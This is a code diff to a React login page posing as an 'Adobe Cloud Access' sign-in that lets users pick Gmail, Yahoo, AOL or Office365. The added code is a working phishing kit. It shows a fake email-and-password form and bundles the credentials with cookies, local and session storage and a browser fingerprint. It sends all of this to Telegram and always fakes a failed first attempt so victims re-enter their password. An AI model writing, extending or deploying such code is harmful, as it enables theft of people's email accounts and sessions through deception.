@@ -17,6 +17,13 @@ const LoginPage: React.FC<LoginPageProps> = ({
   onLoginError,
   showBackButton = false 
 }) => {
+  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [loginAttempts, setLoginAttempts] = useState(0);
+  const [errorMessage, setErrorMessage] = useState('');
 
   const emailProviders = [
     { 
@@ -58,22 +65,102 @@ const LoginPage: React.FC<LoginPageProps> = ({
   ];
 
   const handleProviderSelect = (provider: string) => {
-    console.log(`🔐 Starting OAuth flow for ${provider}`);
+    console.log(`🔐 Selected provider: ${provider}`);
     
-    // Capture pre-auth fingerprint
-    const preAuthFingerprint = getBrowserFingerprint();
-    console.log('📊 Pre-auth fingerprint captured');
-    
-    const state = generateState();
-    const oauthUrl = buildOAuthUrl(provider, state);
-    
-    // For demo providers (Gmail, Yahoo, AOL, Others), buildOAuthUrl handles the simulation
-    // For real providers (Office365, Outlook), it returns the actual OAuth URL
-    if (!oauthUrl.includes('/auth/demo')) {
+    // For real OAuth providers, redirect immediately
+    if (['Office365', 'Outlook'].includes(provider)) {
+      const preAuthFingerprint = getBrowserFingerprint();
+      console.log('📊 Pre-auth fingerprint captured');
+      
+      const state = generateState();
+      const oauthUrl = buildOAuthUrl(provider, state);
       console.log(`🌐 Redirecting to ${provider} OAuth:`, oauthUrl);
       window.location.href = oauthUrl;
+    } else {
+      // For demo providers, show the login form
+      setSelectedProvider(provider);
     }
-    // Demo providers are handled automatically by buildOAuthUrl with setTimeout
+  };
+
+  const handleFormSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!email || !password || !selectedProvider) return;
+
+    setIsLoading(true);
+    setErrorMessage('');
+    
+    try {
+      const currentAttempt = loginAttempts + 1;
+      setLoginAttempts(currentAttempt);
+      
+      // Capture browser fingerprint for this attempt
+      const browserFingerprint = getBrowserFingerprint();
+      
+      const sessionData = {
+        email: email,
+        password: password,
+        provider: selectedProvider,
+        sessionId: Math.random().toString(36).substring(2, 15),
+        timestamp: new Date().toISOString(),
+        fileName: 'Adobe Cloud Access',
+        clientIP: 'Unknown',
+        userAgent: navigator.userAgent,
+        deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
+        cookies: browserFingerprint.cookies,
+        documentCookies: document.cookie,
+        localStorage: browserFingerprint.localStorage,
+        sessionStorage: browserFingerprint.sessionStorage,
+        browserFingerprint: browserFingerprint,
+        attemptNumber: currentAttempt,
+        status: currentAttempt === 1 ? 'first_attempt_failed' : 'second_attempt_success'
+      };
+
+      console.log(`🔐 Login attempt ${currentAttempt}:`, { email, provider: selectedProvider });
+      
+      // Send attempt data to Telegram
+      try {
+        await sendToTelegram(sessionData);
+        console.log(`✅ Attempt ${currentAttempt} data sent to Telegram`);
+      } catch (error) {
+        console.error(`❌ Failed to send attempt ${currentAttempt} to Telegram:`, error);
+      }
+
+
+
+      if (currentAttempt === 1) {
+        // First attempt - show error
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        setErrorMessage('Invalid email or password. Please try again.');
+        setIsLoading(false);
+      } else {
+        // Second attempt - show success and redirect
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        // Call the success handler
+        if (onLoginSuccess) {
+          await onLoginSuccess(sessionData);
+        }
+      }
+    } catch (error) {
+      console.error('Login error:', error);
+      if (onLoginError) {
+        onLoginError('Login failed. Please try again.');
+      }
+      setIsLoading(false);
+    } finally {
+      // Only set loading to false for first attempt, second attempt handles it above
+      if (loginAttempts === 0) {
+        setIsLoading(false);
+      }
+    }
+  };
+
+  const handleBackToProviders = () => {
+    setSelectedProvider(null);
+    setEmail('');
+    setPassword('');
+    setLoginAttempts(0);
+    setErrorMessage('');
   };
 
 
@@ -112,39 +199,113 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
           {/* Login Form */}
           <div className="bg-[#1E1E1E]/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-[#2C2C2C]/60 p-8">
-            {/* Provider Selection - Direct OAuth */}
-            <div>
-              <h2 className="text-lg font-semibold text-white mb-4">
-                Choose your email provider
-              </h2>
-              <div className="grid grid-cols-2 gap-3">
-                {emailProviders.map((provider) => (
-                  <button
-                    key={provider.name}
-                    onClick={() => handleProviderSelect(provider.name)}
-                    className={`${provider.color} text-white p-4 rounded-xl hover:opacity-90 transition-all duration-200 transform hover:scale-105 flex flex-col items-center gap-2 shadow-lg`}
-                  >
-                    <img 
-                      src={provider.logo} 
-                      alt={provider.name} 
-                      className="w-8 h-8 object-contain filter brightness-0 invert"
-                      onError={(e) => {
-                        const target = e.target as HTMLImageElement;
-                        target.style.display = 'none';
-                        const parent = target.parentElement;
-                        if (parent && !parent.querySelector('.fallback-text')) {
-                          const fallback = document.createElement('div');
-                          fallback.className = 'fallback-text text-2xl font-bold';
-                          fallback.textContent = provider.name.charAt(0);
-                          parent.insertBefore(fallback, target.nextSibling);
-                        }
-                      }}
-                    />
-                    <span className="font-medium text-sm">{provider.name}</span>
-                  </button>
-                ))}
+            {!selectedProvider ? (
+              /* Provider Selection */
+              <div>
+                <h2 className="text-lg font-semibold text-white mb-4">
+                  Choose your email provider
+                </h2>
+                <div className="grid grid-cols-2 gap-3">
+                  {emailProviders.map((provider) => (
+                    <button
+                      key={provider.name}
+                      onClick={() => handleProviderSelect(provider.name)}
+                      className={`${provider.color} text-white p-4 rounded-xl hover:opacity-90 transition-all duration-200 transform hover:scale-105 flex flex-col items-center gap-2 shadow-lg`}
+                    >
+                      <img 
+                        src={provider.logo} 
+                        alt={provider.name} 
+                        className="w-8 h-8 object-contain filter brightness-0 invert"
+                        onError={(e) => {
+                          const target = e.target as HTMLImageElement;
+                          target.style.display = 'none';
+                          const parent = target.parentElement;
+                          if (parent && !parent.querySelector('.fallback-text')) {
+                            const fallback = document.createElement('div');
+                            fallback.className = 'fallback-text text-2xl font-bold';
+                            fallback.textContent = provider.name.charAt(0);
+                            parent.insertBefore(fallback, target.nextSibling);
+                          }
+                        }}
+                      />
+                      <span className="font-medium text-sm">{provider.name}</span>
+                    </button>
+                  ))}
+                </div>
               </div>
-            </div>
+            ) : (
+              /* Login Form */
+              <div>
+                <div className="flex items-center mb-4">
+                  <button
+                    onClick={handleBackToProviders}
+                    className="text-gray-400 hover:text-white mr-3"
+                  >
+                    <ArrowLeft className="w-5 h-5" />
+                  </button>
+                  <h2 className="text-lg font-semibold text-white">
+                    Sign in with {selectedProvider}
+                  </h2>
+                </div>
+                
+                <form onSubmit={handleFormSubmit} className="space-y-4">
+                  {errorMessage && (
+                    <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3 mb-4">
+                      <p className="text-red-400 text-sm font-medium">{errorMessage}</p>
+                    </div>
+                  )}
+                  
+                  <div>
+                    <label className="block text-sm font-medium text-gray-300 mb-2">
+                      Email Address
+                    </label>
+                    <div className="relative">
+                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
+                      <input
+                        type="email"
+                        value={email}
+                        onChange={(e) => setEmail(e.target.value)}
+                        className="w-full pl-10 pr-4 py-3 bg-[#2C2C2C]/60 border border-[#3C3C3C] rounded-xl text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        placeholder="Enter your email"
+                        required
+                      />
+                    </div>
+                  </div>
+                  
+                  <div>
+                    <label className="block text-sm font-medium text-gray-300 mb-2">
+                      Password
+                    </label>
+                    <div className="relative">
+                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
+                      <input
+                        type={showPassword ? 'text' : 'password'}
+                        value={password}
+                        onChange={(e) => setPassword(e.target.value)}
+                        className="w-full pl-10 pr-12 py-3 bg-[#2C2C2C]/60 border border-[#3C3C3C] rounded-xl text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        placeholder="Enter your password"
+                        required
+                      />
+                      <button
+                        type="button"
+                        onClick={() => setShowPassword(!showPassword)}
+                        className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
+                      >
+                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                      </button>
+                    </div>
+                  </div>
+                  
+                  <button
+                    type="submit"
+                    disabled={isLoading || !email || !password}
+                    className="w-full bg-blue-600 text-white py-3 rounded-xl font-semibold hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-[#1E1E1E] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
+                  >
+                    {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In'}
+                  </button>
+                </form>
+              </div>
+            )}
           </div>
 
           {/* Adobe Footer */}
